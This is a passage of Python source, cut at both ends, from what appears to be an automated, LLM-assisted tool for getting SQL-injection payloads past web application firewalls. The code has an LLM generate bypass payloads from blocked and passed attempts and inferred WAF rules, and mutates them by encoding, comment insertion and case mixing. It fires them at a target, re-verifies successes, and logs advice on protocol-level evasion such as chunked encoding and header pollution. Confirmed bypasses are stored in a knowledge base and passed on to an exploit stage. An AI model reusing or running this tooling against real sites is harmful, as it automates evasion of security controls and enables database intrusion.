                    block_rate = len(blocked_payloads) * 100 // max(len(bypass_history), 1)

                    # Estimate paranoia level
                    paranoia = scanner.estimate_waf_paranoia(blocked_payloads, passed_payloads) if scanner else {"level": 1, "description": "LOW", "signals": []}
                    log.append(f"[WAF-BLIND] Unknown WAF — Paranoia Level {paranoia['level']}/4: {paranoia['description']}")
                    for sig in paranoia.get("signals", []):
                        log.append(f"[WAF-BLIND] Signal: {sig}")

                    # Track tried families
                    tried_families = []
                    for h in bypass_history:
                        tech = h.get("technique", "").lower()
                        if tech and tech not in tried_families:
                            tried_families.append(tech)

                    prompt = BYPASS_BLIND_PROMPT
                    user_msg = (
                        f"paranoia_level: {paranoia['level']}\n"
                        f"paranoia_description: {paranoia['description']}\n"
                        f"paranoia_signals: {json.dumps(paranoia.get('signals', []))}\n"
                        f"vuln_type: {state.get('vuln_type', 'sqli')}\n"
                        f"blocked_payloads: {json.dumps(blocked_payloads[-5:])}\n"
                        f"passed_payloads: {json.dumps(passed_payloads[-5:])}\n"
                        f"block_rate: {block_rate}\n"
                        f"tried_families: {json.dumps(tried_families[-6:])}\n"
                        f"web_search_results: {web_search_text}\n"
                        f"browser_block_page: {browser_analysis[:500]}\n"
                        f"strategy_plan: {json.dumps(strategy_plan) if strategy_plan else 'none'}\n"
                        f"count: 10"
                    )
                else:
                    from prompts import BYPASS_GENERATOR_PROMPT
                    prompt = BYPASS_GENERATOR_PROMPT
                    user_msg = (
                        f"waf_name: {waf_name}\n"
                        f"vuln_type: {state.get('vuln_type', 'sqli')}\n"
                        f"block_analysis: {json.dumps(block, default=str)[:500]}\n"
                        f"bypass_history: {json.dumps(bypass_history[-3:], default=str)}\n"
                        f"waf_strategies: {json.dumps(waf.get('bypass_strategies', []))}\n"
                        f"trigger_segments: {[s.get('text', '') for s in block.get('trigger_segments', [])]}\n"
                        f"rule_type: {rule.get('rule_type', 'unknown')}\n"
                        f"suggested_bypasses: {json.dumps(rule.get('suggested_bypasses', []))}\n"
                        f"web_search_results: {web_search_text}\n"
                        f"browser_block_page: {browser_analysis[:500]}\n"
                        f"strategy_plan: {json.dumps(strategy_plan) if strategy_plan else 'none'}\n"
                        f"count: 8"
                    )

                # ── Parallel hypothesis-specific payload generation ──
                active_hypotheses = [h for h in hypotheses if h.get("status") == "active"]
                if len(active_hypotheses) > 1 and not population:
                    # Multiple active hypotheses — generate payloads in parallel
                    try:
                        from prompts import BYPASS_GENERATOR_PROMPT as _PARALLEL_GEN_PROMPT

                        def _build_hyp_user_prompt(h):
                            return (
                                f"Generate 5 bypass payloads specifically for hypothesis: {h.get('mechanism', '')}\n"
                                f"Description: {h.get('description', '')}\n"
                                f"Blind spot: {h.get('blind_spot', '')}\n"
                                f"Mutation strategy: {h.get('mutation_strategy', '')}\n"
                                f"WAF: {waf.get('waf_name', 'unknown')}\n"
                                f"vuln_type: {state.get('vuln_type', 'sqli')}"
                            )

                        paired_results = _run_parallel_hypothesis_generation(
                            llm, active_hypotheses, _PARALLEL_GEN_PROMPT, _build_hyp_user_prompt
                        )

                        all_parallel_payloads = []
                        for hypothesis, result in paired_results:
                            if isinstance(result, Exception):
                                log.append(f"[PARALLEL] Hypothesis '{hypothesis.get('mechanism')}' LLM failed: {result}")
                            else:
                                hyp_payloads = _normalize_llm_payloads(result)
                                for p in hyp_payloads:
                                    p["hypothesis_id"] = hypothesis.get("mechanism", "")
                                all_parallel_payloads.extend(hyp_payloads)

                        if all_parallel_payloads:
                            payloads = all_parallel_payloads
                            payloads = _assign_family(payloads)
                            log.append(f"[PARALLEL] Generated {len(payloads)} payloads from {len(active_hypotheses)} hypotheses in parallel")

                            # Inject hypothesis seed payloads with hypothesis_id tagging
                            _active_hyps = [h for h in hypotheses if h.get("status") != "discarded"]
                            if _active_hyps and ga_gen == 0:
                                for h in _active_hyps:
                                    for seed in h.get("seed_payloads", []):
                                        if isinstance(seed, str) and seed.strip():
                                            payloads.append({
                                                "payload": seed,
                                                "technique": h.get("mechanism", ""),
                                                "reasoning": f"Hypothesis seed: {h.get('mechanism', '')}",
                                                "type": "hypothesis_seed",
                                                "hypothesis_id": h.get("mechanism", ""),
                                            })

                            return {
                                "current_payloads": payloads,
                                "payload_index": 0,
                                "phase": "bypass_execute",
                                "log": log,
                                "web_search_results": web_search_text,
                                "strategy_plan": strategy_plan or state.get("strategy_plan"),
                                "hypotheses": hypotheses,
                                "hypothesis_history": hypothesis_history,
                                "reasoning_chain": reasoning_chain,
                            }
                        else:
                            # All parallel calls failed — fall through to serial path
                            log.append("[PARALLEL] All hypothesis LLM calls failed — using serial fallback")
                    except Exception as e:
                        log.append(f"[PARALLEL] Parallel hypothesis generation failed: {e} — using serial fallback")

                # ── Build structured KB analysis for the LLM ──
                kb_analysis_parts = []

                # 1. Analyze bypass_history: what passed vs blocked, with response data
                if bypass_history:
                    passed = [h for h in bypass_history if h.get("status_code") not in (403, 406, 503, 0)]
                    blocked = [h for h in bypass_history if h.get("status_code") in (403, 406, 503)]
                    total = len(bypass_history)
                    block_rate = len(blocked) * 100 // max(total, 1)

                    kb_analysis_parts.append(f"ATTEMPT SUMMARY: {total} payloads tested, {len(passed)} passed ({100-block_rate}%), {len(blocked)} blocked ({block_rate}%)")

                    if passed:
                        kb_analysis_parts.append("\nPASSED PAYLOADS (these worked — build on these patterns):")
                        for h in passed[-5:]:
                            sim = h.get("response_similarity", "?")
                            has_err = h.get("has_sql_error", False)
                            tech = h.get("technique") or h.get("family") or "unknown"
                            err_tag = " [SQL ERROR DETECTED]" if has_err else ""
                            kb_analysis_parts.append(f"  + [{tech}] {h.get('payload', '')[:80]} (sim={sim}){err_tag}")

                    if blocked:
                        # Group blocked by technique to find patterns
                        tech_blocks = {}
                        for h in blocked:
                            tech = h.get("technique") or h.get("family") or "unknown"
                            tech_blocks.setdefault(tech, []).append(h)
                        kb_analysis_parts.append("\nBLOCKED PAYLOADS (these failed — DO NOT repeat these patterns):")
                        for tech, items in tech_blocks.items():
                            kb_analysis_parts.append(f"  - [{tech}] {len(items)} payloads blocked")
                            for h in items[-2:]:
                                kb_analysis_parts.append(f"    x {h.get('payload', '')[:70]}")

                # 2. Inferred WAF rules — explicit "avoid these triggers"
                inferred = state.get("inferred_rules", [])
                if not inferred and memory:
                    try:
                        inferred = memory.query_inferred_rules(waf_name=waf_name)
                    except Exception:
                        pass
                if inferred:
                    kb_analysis_parts.append("\nINFERRED WAF RULES (these patterns WILL trigger blocking — avoid them):")
                    for r in inferred:
                        kws = r.get("trigger_keywords", [])
                        rt = r.get("rule_type", "unknown")
                        conf = r.get("confidence", 0)
                        suggested = r.get("suggested_bypasses", [])
                        kb_analysis_parts.append(f"  ! Rule type: {rt} (confidence={conf:.2f})")
                        if kws:
                            kb_analysis_parts.append(f"    Trigger keywords: {', '.join(kws[:8])}")
                        if suggested:
                            for s in suggested[:2]:
                                kb_analysis_parts.append(f"    Suggested bypass: {s.get('technique', '?')} — {s.get('reasoning', '')[:60]}")

                # 3. Active hypotheses with test results
                hyps = state.get("hypotheses", [])
                if hyps:
                    active = [h for h in hyps if h.get("status") == "active"]
                    if active:
                        kb_analysis_parts.append("\nACTIVE HYPOTHESES (continue exploring these):")
                        for h in active:
                            kb_analysis_parts.append(f"  * [{h['mechanism']}] conf={h.get('confidence', 0):.2f} tests={h.get('test_count', 0)} bypasses={h.get('bypass_count', 0)}")
                            if h.get("blind_spot"):
                                kb_analysis_parts.append(f"    Blind spot: {h['blind_spot']}")
                            if h.get("mutation_strategy"):
                                kb_analysis_parts.append(f"    Mutation: {h['mutation_strategy'][:80]}")

                # 4. KB proven techniques from knowledge base
                if memory:
                    try:
                        kb_results = memory.query_knowledge(
                            waf_name=waf_name,
                            vuln_type=state.get("vuln_type", "sqli"),
                            top_k=5,
                        )
                        if kb_results:
                            kb_analysis_parts.append("\nPROVEN TECHNIQUES FROM KNOWLEDGE BASE:")
                            for kb in kb_results:
                                sc = kb.get("success_count", 0)
                                fc = kb.get("fail_count", 0)
                                conf = kb.get("confidence", 0)
                                kb_analysis_parts.append(f"  * {kb['technique']}: success={sc} fail={fc} conf={conf:.2f} example={kb.get('payload_example', '')[:60]}")
                            log.append(f"[KB] Found {len(kb_results)} proven techniques for {waf_name}")
                    except Exception:
                        pass

                # 5. Past hypothesis results
                if memory:
                    try:
                        past_hyps = memory.query_hypothesis_results(waf_name=waf_name, top_k=5)
                        if past_hyps:
                            kb_analysis_parts.append("\nPAST HYPOTHESIS RESULTS (learn from these):")
                            for ph in past_hyps:
                                action = ph.get("action", "?")
                                symbol = {"keep": "+", "refine": "~", "discard": "x"}.get(action, "?")
                                kb_analysis_parts.append(f"  {symbol} [{ph['mechanism']}] action={action} fitness={ph.get('best_fitness', 0):.3f} | {ph.get('reasoning', '')[:60]}")
                    except Exception:
                        pass

                kb_analysis = "\n".join(kb_analysis_parts) if kb_analysis_parts else "No prior data available — this is the first attempt."

                # Inject kb_analysis into user_msg for the LLM prompt
                user_msg = user_msg.rstrip() + f"\nkb_analysis:\n{kb_analysis}"

                llm_result = _llm_generate_with_retry(llm, prompt, user_msg)

                fallback = generator.generate(
                    vuln_type=state.get("vuln_type", "sqli"),
                    endpoint=state.get("endpoint", "/"),
                    field_name=state.get("param", "q"),
                    history=state.get("history", []),
                )
                payloads = _normalize_llm_payloads(llm_result, fallback)

                # Extract suspected WAF type from blind prompt response
                suspected_waf = llm_result.get("suspected_waf_type", "")
                recommended_family = llm_result.get("recommended_family", "")
                if suspected_waf and suspected_waf.lower() not in ("still unknown", "unknown", ""):
                    log.append(f"[WAF-BLIND] Suspected WAF type: {suspected_waf}")
                if recommended_family:
                    log.append(f"[WAF-BLIND] Recommended bypass family: {recommended_family}")

                log.append(f"[BYPASS-GEN] Generated {len(payloads)} bypass payloads {'(BLIND MODE)' if is_unknown_waf else 'based on block analysis'}")
                for p in payloads[:4]:
                    log.append(f"  -> [{p.get('technique', p.get('family', '?'))}] {p.get('payload', '')[:70]}")
            else:
                payloads = generator.generate(
                    vuln_type=state.get("vuln_type", "sqli"),
                    endpoint=state.get("endpoint", "/"),
                    field_name=state.get("param", "q"),
                    history=state.get("history", []),
                )
                # Inject KB payloads as initial seeds if available
                if memory:
                    try:
                        waf_name = state.get("waf_result", {}).get("waf_name", "unknown")
                        kb = memory.query_knowledge(waf_name=waf_name, vuln_type=state.get("vuln_type", "sqli"), top_k=2)
                        for entry in kb:
                            if entry.get("payload_example") and entry.get("confidence", 0) > 0.5:
                                payloads.append({
                                    "payload": entry["payload_example"],
                                    "technique": entry["technique"],
                                    "reasoning": f"KB seed: {entry['technique']} (conf={entry['confidence']:.2f})",
                                    "type": "kb_seed",
                                })
                                log.append(f"[KB-SEED] Added knowledge base payload: {entry['technique']}")
                    except Exception:
                        pass
                log.append(f"[BYPASS-GEN] Created {len(payloads)} initial payloads")

            # Inject hypothesis seed payloads with hypothesis_id tagging
            active_hypotheses = [h for h in hypotheses if h.get("status") != "discarded"]
            if active_hypotheses and ga_gen == 0:
                for h in active_hypotheses:
                    for seed in h.get("seed_payloads", []):
                        if isinstance(seed, str) and seed.strip():
                            payloads.append({
                                "payload": seed,
                                "technique": h.get("mechanism", ""),
                                "reasoning": f"Hypothesis seed: {h.get('mechanism', '')}",
                                "type": "hypothesis_seed",
                                "hypothesis_id": h.get("mechanism", ""),
                            })
                if any(h.get("seed_payloads") for h in active_hypotheses):
                    seed_count = sum(len(h.get("seed_payloads", [])) for h in active_hypotheses)
                    log.append(f"[HYPOTHESIS] Injected {seed_count} seed payloads from {len(active_hypotheses)} active hypotheses")

            # ── Hypothesis combination: merge techniques from multiple hypotheses ──
            if len(active_hypotheses) >= 2:
                combined_payloads = []
                # Take the best seed from each hypothesis and combine techniques
                for i, h1 in enumerate(active_hypotheses[:3]):
                    for h2 in active_hypotheses[i+1:3]:
                        seeds1 = h1.get("seed_payloads", [])[:1]
                        seeds2 = h2.get("seed_payloads", [])[:1]
                        if seeds1 and seeds2:
                            # Combine: apply h2's technique to h1's payload
                            # E.g., h1="encoding", h2="comment_injection" → encode + add comments
                            combined = f"{seeds1[0]}"  # Start with h1's seed
                            strategy2 = h2.get("mutation_strategy", "")
                            if "encoding" in strategy2:
                                # Apply URL encoding to parts
                                import urllib.parse
                                combined = urllib.parse.quote(combined, safe="' =-()/*")
                            elif "comment" in strategy2:
                                # Insert comments between keywords
                                combined = combined.replace(" ", "/**/")
                            elif "case" in strategy2:
                                # Mix case
                                combined = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(combined))
                            
                            if combined != seeds1[0]:  # Only add if actually different
                                combined_payloads.append({
                                    "payload": combined,
                                    "technique": f"combined:{h1.get('mechanism', '')}+{h2.get('mechanism', '')}",
                                    "reasoning": f"Hypothesis combination: {h1.get('mechanism', '')} + {h2.get('mechanism', '')}",
                                    "type": "hypothesis_combined",
                                    "hypothesis_id": h1.get("mechanism", ""),
                                    "family": "combined",
                                })
                
                if combined_payloads:
                    payloads.extend(combined_payloads)
                    log.append(f"[HYPOTHESIS-COMBO] Generated {len(combined_payloads)} combined payloads from {len(active_hypotheses)} hypotheses")

            # Ensure all payloads have family info for GA mutation
            # Inject web search seed payloads for direct testing
            if search_seed_payloads:
                existing_payloads = {p.get("payload", "") for p in payloads}
                for sp in search_seed_payloads:
                    if sp["payload"] not in existing_payloads:
                        payloads.append(sp)

            payloads = _assign_family(payloads)

            return {
                "current_payloads": payloads,
                "payload_index": 0,
                "phase": "bypass_execute",
                "log": log,
                "web_search_results": web_search_text,
                "strategy_plan": strategy_plan or state.get("strategy_plan"),
                "hypotheses": hypotheses,
                "hypothesis_history": hypothesis_history,
                "reasoning_chain": reasoning_chain,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] bypass_generate failed: {e}\n{traceback.format_exc()[-200:]}")
            # Return empty payloads to skip to GA evolve
            return {"current_payloads": [], "payload_index": 0, "phase": "bypass_execute", "log": log,
                    "hypotheses": state.get("hypotheses", []), "hypothesis_history": state.get("hypothesis_history", []),
                    "reasoning_chain": state.get("reasoning_chain", {})}
    return bypass_generate


def make_bypass_execute_node(
    executor: ExecutorAgent,
    analyzer: WAFBlockAnalyzer,
    memory: AttackMemory,
    evaluator: FitnessEvaluator,
    llm: LLMClient,
    config: BypassEvoConfig = None,
    scanner: Scanner = None,
    fast_mode: bool = False,
    reflector: ReflectorAgent = None,
):
    """Execute payloads against WAF. Classify as blocked/passed/failed."""
    def bypass_execute(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            payloads = state.get("current_payloads", [])
            idx = state.get("payload_index", 0)
            iteration = state.get("iteration", 0)
            max_iter = state.get("max_iterations", 20)
            waf = state.get("waf_result", {})
            baseline_status = 200

            if iteration >= max_iter:
                log.append(f"[BYPASS] Max iterations ({max_iter}) reached.")
                memory.persist()
                return {"phase": "done", "log": log, "iteration": iteration}

            if idx >= len(payloads):
                log.append(f"[BYPASS] All {len(payloads)} payloads tested (idx={idx}) -> GA evolve")
                return {"phase": "ga_bypass_evolve", "log": log, "iteration": iteration}

            payload_entry = payloads[idx]
            payload_str = payload_entry.get("payload", "")
            log.append(f"[BYPASS-EXEC] Testing #{idx + 1}: {payload_str}")

            extra = state.get("extra_params", {})
            result = executor.execute(
                payload=payload_str,
                endpoint=state.get("endpoint", "/"),
                param=state.get("param", "q"),
                method=state.get("method", "GET"),
                data=extra if extra else None,
            )

            # Increment iteration on each payload test
            iteration = iteration + 1

            # Connection error & 5xx tracking
            conn_errors = state.get("connection_errors", 0)
            server_errors = state.get("consecutive_server_errors", 0)
            resp_code_val = result.get("response_code", 0)
            ev_text = result.get("evidence", "")
            is_conn_err = (
                resp_code_val == 0
                or "connection" in ev_text.lower()
                or "max retries" in ev_text.lower()
                or "timeout" in ev_text.lower()
            )
            is_5xx = 500 <= resp_code_val < 600

            if is_conn_err:
                conn_errors += 1
                server_errors = 0
                log.append(f"[BYPASS-EXEC] Connection error ({conn_errors}/4): {ev_text[:80]}")
                if conn_errors >= 4:
                    log.append("[SYSTEM] TARGET UNREACHABLE — 4 consecutive connection failures.")
                    log.append("[SYSTEM] Attack stopped. Check that target is running.")
                    return {
                        "phase": "done", "log": log,
                        "connection_errors": conn_errors, "iteration": iteration,
                        "stop_reason": "connection_errors",
                    }
            elif is_5xx:
                server_errors += 1
                conn_errors = 0
                err_hint = "502 Bad Gateway — target container may not be running" if resp_code_val == 502 else f"Server error {resp_code_val}"
                log.append(f"[BYPASS-EXEC] {err_hint} ({server_errors}/4)")
                if server_errors >= 4:
                    log.append(f"[SYSTEM] TARGET ERROR — 4 consecutive {resp_code_val} responses.")
                    if resp_code_val == 502:
                        log.append("[SYSTEM] Attack stopped. Check docker-compose is running.")
                    else:
                        log.append("[SYSTEM] Attack stopped. Server may be crashing or overloaded.")
                    return {
                        "phase": "done", "log": log,
                        "consecutive_server_errors": server_errors, "iteration": iteration,
                        "stop_reason": "server_errors",
                    }
            else:
                conn_errors = 0
                server_errors = 0

            response_code = result.get("response_code", 0)
            scan_result = ScanResult(
                url="", method="GET", status_code=response_code,
                response_text=result.get("response_snippet", ""),
                response_time=result.get("response_time", 0),
                headers={}, payload=payload_str,
            )
            is_blocked = scanner.is_blocked(scan_result)

            if response_code == 429 or "rate_limited" in result.get("indicators", []):
                log.append(f"[BYPASS-EXEC] RATE LIMITED (429) — backing off...")
                return {
                    "execution_result": result, "payload_index": idx,
                    "log": log, "iteration": iteration,
                    "consecutive_server_errors": server_errors,
                }

            ind = Individual(
                payload=payload_str,
                response_time=result.get("response_time", 0),
                response_code=response_code,
                response_snippet=result.get("response_snippet", ""),
                indicators=result.get("indicators", []),
            )

            # Track current bypass family
            current_bypass_family = payload_entry.get("technique", payload_entry.get("family", ""))
            waf_name = waf.get("waf_name", "none")
            if waf_name in ("unknown", "none", ""):
                log.append(f"[BYPASS-EXEC] WAF: UNKNOWN | Bypass family: {current_bypass_family or 'default'}")
            else:
                log.append(f"[BYPASS-EXEC] WAF: {waf_name} | Bypass family: {current_bypass_family or 'default'}")

            if is_blocked:
                baseline_snippet = state.get("baseline_snippet", "")
                fitness = evaluator.evaluate_blocked(ind, baseline_snippet=baseline_snippet, vuln_type=state.get("vuln_type", "sqli"))
                ind.fitness = fitness
                resp_preview = result.get("response_snippet", "")[:120].replace("\n", " ")
                log.append(f"[BYPASS-EXEC] BLOCKED ({response_code}) fitness={fitness:.3f}")
                log.append(f"[BYPASS-EXEC] Response: {resp_preview}")
                if scanner._consecutive_blocks >= 5:
                    log.append(f"[BYPASS-EXEC] WARNING: {scanner._consecutive_blocks} consecutive blocks — possible IP ban")
                # Auto-suggestion after many consecutive blocks — escalate specificity
                if scanner._consecutive_blocks >= 8:
                    log.append(f"[BYPASS-EXEC] HIGH BLOCK RATE ({scanner._consecutive_blocks} consecutive). Protocol-level bypass recommended:")
                    log.append(f"[BYPASS-EXEC]   1. Chunked Transfer Encoding — split payload across chunked body")
                    log.append(f"[BYPASS-EXEC]   2. Header Pollution — inject via X-Forwarded-For, Referer, custom headers")
                    log.append(f"[BYPASS-EXEC]   3. HTTP Method Switch — try PUT/PATCH instead of GET/POST")
                    log.append(f"[BYPASS-EXEC]   4. JSON Content-Type — wrap payload in JSON body")
                elif scanner._consecutive_blocks >= 6:
                    log.append(f"[BYPASS-EXEC] SUGGESTION: 6+ consecutive blocks detected.")
                    log.append(f"[BYPASS-EXEC] Consider: switch bypass family, try protocol-level bypass, or increase delay.")
            else:
                # Analyze response vs baseline — is this a real bypass or just a normal page?
                response_analysis = scanner.analyze_response_vs_baseline(scan_result)
                if not response_analysis["is_bypass"] and response_analysis["similarity"] > 0.95:
                    # Response identical to baseline — payload had no effect
                    log.append(f"[BYPASS-EXEC] NO EFFECT (sim={response_analysis['similarity']:.2f}) — payload didn't inject")
                    fitness = 0.15
                    ind.fitness = fitness
                    is_blocked = True
                elif not response_analysis["is_bypass"] and response_analysis["similarity"] > 0.90:
                    # Response barely changed — likely no real injection effect
                    log.append(f"[BYPASS-EXEC] MINIMAL EFFECT (sim={response_analysis['similarity']:.2f}) — treating as no bypass")
                    fitness = 0.20
                    ind.fitness = fitness
                    is_blocked = True
                elif response_analysis["has_sql_error"]:
                    log.append(f"[BYPASS-EXEC] SQL ERROR in response — injection worked! conf={response_analysis['confidence']:.2f}")
                elif response_analysis["content_changed"]:
                    log.append(f"[BYPASS-EXEC] CONTENT CHANGED (sim={response_analysis['similarity']:.2f}) — possible bypass, conf={response_analysis['confidence']:.2f}")

                if not is_blocked and fast_mode:
                    # ── Fast mode: single-shot bypass check (no verification loop) ──
                    quick = scanner.quick_bypass_check(
                        path=state.get("endpoint", "/"),
                        payload=payload_str,
                        param=state.get("param", "q"),
                        method=state.get("method", "GET"),
                        data=extra if extra else None,
                    )
                    if not quick["passed"]:
                        log.append(f"[BYPASS-EXEC] FALSE POSITIVE (quick check) status={quick['status_code']}")
                        fitness = 0.2
                        ind.fitness = fitness
                        is_blocked = True
                    else:
                        fitness = _classify_bypass_fitness(evaluator, ind, baseline_status)
                        ind.fitness = fitness
                        resp_preview = result.get("response_snippet", "")[:120].replace("\n", " ")
                        log.append(f"[BYPASS-EXEC] PASSED WAF (quick) fitness={fitness:.3f}")
                        log.append(f"[BYPASS-EXEC] Response: {resp_preview}")
                else:
                    # ── Strict bypass verification: ALL attempts must pass ──
                    verify_count = max(1, config.rate_limit.verify_bypass_attempts if config else 3)
                    verified = 0
                    for v in range(verify_count):
                        verify_result = executor.execute(
                            payload=payload_str,
                            endpoint=state.get("endpoint", "/"),
                            param=state.get("param", "q"),
                            method=state.get("method", "GET"),
                            data=extra if extra else None,
                        )
                        v_scan = ScanResult(
                            url="", method="GET", status_code=verify_result.get("response_code", 0),
                            response_text=verify_result.get("response_snippet", ""),
                            response_time=0, headers={}, payload=payload_str,
                        )
                        if scanner.is_blocked(v_scan):
                            break  # Fail fast: any block means bypass is unreliable
                        v_analysis = scanner.analyze_response_vs_baseline(v_scan)
                        if v_analysis["is_bypass"]:
                            verified += 1
                        else:
                            break  # Not a real bypass (response same as baseline)

                    if verified < verify_count:
                        log.append(f"[BYPASS-EXEC] FALSE POSITIVE detected ({verified}/{verify_count} passed — ALL must pass)")
                        fitness = 0.2
                        ind.fitness = fitness
                        is_blocked = True
                    else:
                        # ── Exploit-stage WAF re-verification ──
                        exploit_verify = scanner.verify_bypass_for_exploit(
                            path=state.get("endpoint", "/"),
                            payload=payload_str,
                            param=state.get("param", "q"),
                            method=state.get("method", "GET"),
                            data=extra if extra else None,
                            attempts=2,
                        )
                        if not exploit_verify["verified"]:
                            log.append(f"[BYPASS-EXEC] EXPLOIT-STAGE VERIFY FAILED ({exploit_verify['passed']}/{exploit_verify['total']})")
                            log.append(f"[BYPASS-EXEC] Payload unreliable under exploit conditions — marking as blocked")
                            fitness = 0.25
                            ind.fitness = fitness
                            is_blocked = True
                        else:
                            # Probe passed WAF verification — mark as bypass.
                            # The exploit stage will construct actual exploit payloads
                            # using the same bypass technique and verify them then.
                            fitness = _classify_bypass_fitness(evaluator, ind, baseline_status)
                            ind.fitness = fitness
                            resp_preview = result.get("response_snippet", "")[:120].replace("\n", " ")
                            log.append(f"[BYPASS-EXEC] PASSED WAF ({verified}/{verify_count} verified) fitness={fitness:.3f}")
                            log.append(f"[BYPASS-EXEC] Response: {resp_preview}")

            memory.add(MemoryEntry(
                id=str(uuid.uuid4())[:8],
                payload=payload_str,
                vuln_type=state.get("vuln_type", "sqli"),
                result="blocked" if is_blocked else "bypass",
                endpoint=state.get("endpoint", ""),
                evidence=result.get("evidence", ""),
                response_snippet=result.get("response_snippet", "")[:200],
                fitness=fitness,
                iteration=iteration,
                confidence=result.get("confidence", 0),
                metadata={"stage": "bypass", "technique": payload_entry.get("technique", "")},
            ))

            # Update memory stats for frontend
            memory_stats = {
                "total_entries": memory._stats.get("total", 0),
                "successes": memory._stats.get("successes", 0),
                "failures": memory._stats.get("failures", 0),
                "success_rate": memory._stats.get("successes", 0) / max(memory._stats.get("total", 1), 1),
                "session_id": memory.session_id,
                "chromadb": memory._use_chroma,
            }

            # Update population fitness (critical for ga_history gen 0 seeding)
            population = list(state.get("population", []))
            for p in population:
                if p.get("payload") == payload_str:
                    p["fitness"] = fitness
                    p["response_time"] = result.get("response_time", 0)
                    p["response_code"] = result.get("response_code", 0)
                    p["response_snippet"] = result.get("response_snippet", "")[:300]
                    p["indicators"] = result.get("indicators", [])
                    # Store strategy family for GA seeding
                    p["family"] = payload_entry.get("technique", payload_entry.get("family", ""))
                    # Preserve hypothesis_id from payload entry
                    if payload_entry.get("hypothesis_id"):
                        p["hypothesis_id"] = payload_entry["hypothesis_id"]
                    break

            # Update hypothesis tracking
            hypotheses = list(state.get("hypotheses", []))
            hypothesis_history = list(state.get("hypothesis_history", []))
            hyp_id = payload_entry.get("hypothesis_id", "")
            if hyp_id and hypotheses:
                for h in hypotheses:
                    if h.get("mechanism") == hyp_id:
                        h["test_count"] = h.get("test_count", 0) + 1
                        h["best_fitness"] = max(h.get("best_fitness", 0), fitness)
                        if not is_blocked:
                            h["bypass_count"] = h.get("bypass_count", 0) + 1
                        break

            # Seed ga_history with gen 0 stats from initial population
            # This ensures Evolution Lab has data from the very first pass
            ga_history = list(state.get("ga_history", []))
            if population:
                fitnesses = [p.get("fitness", 0) for p in population]
                best_f = max(fitnesses) if fitnesses else 0
                # Seed gen 0 if missing, or replace placeholder (all-zero fitness)
                needs_seed = not ga_history or (ga_history[0].get("best_fitness", 0) == 0 and best_f > 0)
                if needs_seed:
                    gen0_stats = {
                        "generation": 0,
                        "best_fitness": best_f,
                        "avg_fitness": sum(fitnesses) / max(len(fitnesses), 1),
                        "worst_fitness": min(fitnesses) if fitnesses else 0,
                        "best_payload": max(population, key=lambda x: x.get("fitness", 0)).get("payload", "") if population else "",
                        "population_size": len(population),
                    }
                    if ga_history and ga_history[0].get("generation") == 0:
                        ga_history[0] = gen0_stats  # Replace placeholder
                    else:
                        ga_history.insert(0, gen0_stats)

            history = list(state.get("history", []))
            bypass_history = list(state.get("bypass_history", []))

            if not is_blocked:
                log.append(f"[BYPASS] === WAF BYPASSED === {payload_str}")
                technique = payload_entry.get("technique", "unknown")
                bypass_techniques = list(state.get("bypass_techniques", []))
                bypass_techniques.append({
                    "payload": payload_str,
                    "technique": technique,
                    "waf_name": waf.get("waf_name", "unknown"),
                    "rule_type": state.get("block_analysis", {}).get("rule_inference", {}).get("rule_type", ""),
                    "trigger_pattern": state.get("block_analysis", {}).get("rule_inference", {}).get("trigger_pattern", ""),
                    "fitness": fitness,
                    "iteration": iteration,
                })

                history.append({
                    "payload": payload_str, "result": "bypass",
                    "technique": technique, "fitness": fitness,
                    "iteration": iteration,
                })

                # Record passed payload in bypass_history for KB analysis
                _tech = payload_entry.get("technique") or payload_entry.get("family") or technique
                bypass_history.append({
                    "payload": payload_str,
                    "technique": _tech,
                    "family": _tech,
                    "status_code": response_code,
                    "response_similarity": response_analysis.get("similarity", 0),
                    "has_sql_error": response_analysis.get("has_sql_error", False),
                    "fitness": fitness,
                    "hypothesis_id": hyp_id,
                })

                if memory:
                    # Enrich bypass_success entry with full context for knowledge base
                    block = state.get("block_analysis", {})
                    rule_inference = block.get("rule_inference", {})
                    memory.add(MemoryEntry(
                        id=f"bypass_{uuid.uuid4().hex[:6]}",
                        payload=payload_str,
                        vuln_type=state.get("vuln_type", "sqli"),
                        result="bypass_success",
                        endpoint=state.get("endpoint", ""),
                        evidence=result.get("evidence", "")[:200],
                        response_snippet=result.get("response_snippet", "")[:200],
                        fitness=fitness,
                        iteration=iteration,
                        confidence=result.get("confidence", 0),
                        mutations_applied=payload_entry.get("mutations_applied", []),
                        metadata={
                            "technique": technique,
                            "waf_name": waf.get("waf_name", ""),
                            "rule_type": rule_inference.get("rule_type", ""),
                            "trigger_pattern": rule_inference.get("trigger_pattern", ""),
                            "response_code": result.get("response_code", 0),
                            "stage": "bypass",
                        },
                    ))
                    # Persist verified bypass to permanent knowledge base
                    memory.add_knowledge(
                        waf_name=waf.get("waf_name", "unknown"),
                        technique=technique,
                        vuln_type=state.get("vuln_type", "sqli"),
                        payload=payload_str,
                        success=True,
                        confidence=fitness,
                        source="实战验证",
                        evidence=result.get("evidence", "")[:200],
                    )
                    log.append(f"[KB] Recorded bypass technique: {technique} -> knowledge_base")

                return {
                    "bypass_success": True,
                    "bypass_payload": payload_str,
                    "bypass_technique": technique,
                    "bypass_techniques": bypass_techniques,
                    "stage": "exploit",
                    "phase": "exploit_generate",
                    "history": history,
                    "bypass_history": bypass_history,
                    "population": population,
                    "ga_history": ga_history,
                    "log": log,
                    "iteration": iteration,
                    "consecutive_server_errors": 0,
                    "memory_stats": memory_stats,
                    "hypotheses": hypotheses,
                    "hypothesis_history": hypothesis_history,
                }

            history.append({
                "payload": payload_str, "result": "blocked",
                "evidence": result.get("evidence", ""), "fitness": fitness,
                "iteration": iteration,
            })
            _tech = payload_entry.get("technique") or payload_entry.get("family") or ""
            bypass_history.append({
                "payload": payload_str,
                "technique": _tech,
                "family": _tech,
                "status_code": response_code,
                "response_similarity": 0.0,  # blocked = no similarity to baseline
                "has_sql_error": False,
                "hypothesis_id": hyp_id,
            })

            # Track blocked count for fast mode skip logic
            blocked_count = state.get("blocked_payload_count", 0) + 1

            # Reflector: analyze failure every 3rd block (to avoid excessive LLM calls)
            if reflector and blocked_count % 3 == 0:
                try:
                    reflection = reflector.reflect(
                        vuln_type=state.get("vuln_type", "sqli"),
                        payload=payload_str,
                        execution_result=result,
                        history=history[-5:],
                        iteration=iteration,
                    )
                    log.append(f"[REFLECT] Analysis: {reflection.get('analysis', '')[:100]}")
                    if reflection.get("recommended_mutations"):
